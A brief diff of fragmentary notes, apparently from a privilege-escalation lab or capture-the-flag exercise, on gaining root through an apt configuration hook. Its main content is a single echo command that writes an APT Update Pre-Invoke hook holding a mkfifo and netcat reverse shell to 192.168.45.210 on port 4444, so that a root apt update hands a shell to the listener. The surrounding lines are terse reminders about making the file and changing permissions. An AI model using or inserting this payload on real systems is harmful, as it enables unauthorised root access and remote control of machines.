@@ -1,0 +1,11 @@
+for root
+
+in that directory
+
+echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 4444 >/tmp/f"};' > pwn
+
+make a file
+
+or add #!/bin/bash on top of it
+
+change file perms
